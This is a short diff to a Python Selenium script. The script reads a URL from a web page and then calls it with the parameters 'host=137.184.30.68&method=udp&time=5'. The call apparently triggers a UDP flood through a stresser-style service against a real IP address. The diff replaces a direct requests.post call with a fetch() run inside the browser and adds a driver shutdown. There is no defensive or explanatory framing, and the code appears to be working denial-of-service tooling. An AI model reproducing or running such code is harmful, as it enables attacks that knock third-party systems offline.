@@ -40,15 +40,7 @@ def execute():
   time.sleep(8)
   url = driver.execute_script("return document.getElementById('weburl').innerText;")
   print(url)
-  url2 = ""+url+"?host=137.184.30.68&method=udp&time=10"
-
-  headers = CaseInsensitiveDict()
-  headers["Content-Type"] = "application/json"
-  headers["Content-Length"] = "0"
-
-
-  resp = requests.post(url2, headers=headers)
-
-  print(resp.status_code)
+  launch = driver.execute_script("fetch('"+url+"?host=137.184.30.68&method=udp&time=5')")
   time.sleep(10)
+  driver.quit();
 
